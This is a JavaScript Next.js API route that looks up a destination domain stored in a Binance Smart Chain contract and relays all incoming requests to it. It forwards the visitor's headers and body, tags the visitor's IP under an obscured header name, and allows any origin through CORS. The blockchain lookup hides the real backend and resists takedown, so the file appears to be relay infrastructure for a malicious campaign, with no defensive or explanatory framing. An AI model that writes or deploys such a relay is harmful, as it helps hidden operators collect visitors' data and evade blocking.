import fetch from "node-fetch"; // Ensure node-fetch installed if using older Next.js (<13)

// ===== Utility: Get Client IP =====
function getClientIP(req) {
  const cfIP = req.headers["cf-connecting-ip"];
  if (cfIP) return cfIP;

  const xForwardedFor = req.headers["x-forwarded-for"];
  if (xForwardedFor) return xForwardedFor.split(",")[0].trim();

  return req.socket.remoteAddress;
}

// ===== In-memory cache (like PHP temp file) =====
let cache = { domain: null, timestamp: 0 };
const updateInterval = 60 * 1000; // 60 seconds

// ===== Fetch target domain from blockchain =====
async function fetchTargetDomain() {
  const rpcUrls = [
    "https://binance.llamarpc.com",
    "https://bsc.drpc.org"
  ];
  const contractAddress = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
  const data = "0x20965255"; // method id

  for (const rpcUrl of rpcUrls) {
    try {
      const resp = await fetch(rpcUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "eth_call",
          params: [
            {
              to: contractAddress,
              data
            },
            "latest"
          ]
        })
      });

      const json = await resp.json();
      if (json.result) {
        return hexToString(json.result);
      }
    } catch (err) {
      console.error("RPC fetch error:", err);
    }
  }

  throw new Error("Could not fetch target domain");
}

// ===== Convert hex string to ASCII =====
function hexToString(hex) {
  hex = hex.replace(/^0x/, "");
  const length = parseInt(hex.slice(64, 128), 16);
  const dataHex = hex.slice(128, 128 + length * 2);
  let result = "";
  for (let i = 0; i < dataHex.length; i += 2) {
    const charCode = parseInt(dataHex.substr(i, 2), 16);
    if (charCode === 0) break;
    result += String.fromCharCode(charCode);
  }
  return result;
}

// ===== Get target domain with caching =====
async function getTargetDomain() {
  const now = Date.now();
  if (cache.domain && now - cache.timestamp < updateInterval) {
    return cache.domain;
  }
  const domain = await fetchTargetDomain();
  cache = { domain, timestamp: now };
  return domain;
}

// ===== Main handler =====
export default async function handler(req, res) {
  // CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "*");
  if (req.method === "OPTIONS") {
    res.status(204).end();
    return;
  }

  const { e } = req.query;

  // Ping
  if (e === "ping_proxy") {
    res.setHeader("Content-Type", "text/plain");
    res.status(200).send("pong");
    return;
  }

  if (!e) {
    res.status(400).send("Missing endpoint");
    return;
  }

  try {
    const targetDomain = await getTargetDomain();
    const endpoint = `/${decodeURIComponent(e).replace(/^\//, "")}`;
    const url = `${targetDomain}${endpoint}`;

    const headers = { ...req.headers };
    delete headers.host;
    delete headers.origin;
    delete headers["accept-encoding"];
    delete headers["content-encoding"];

    headers["x-dfkjldifjlifjd"] = getClientIP(req);

    const proxyResp = await fetch(url, {
      method: req.method,
      headers,
      body: req.method !== "GET" && req.method !== "HEAD" ? JSON.stringify(req.body) : undefined,
    });

    const contentType = proxyResp.headers.get("content-type") || "application/json";
    const data = await proxyResp.text();

    res.setHeader("Content-Type", contentType);
    res.status(proxyResp.status).send(data);
  } catch (error) {
    console.error(error);
    res.status(500).send(`error: ${error.message}`);
  }
}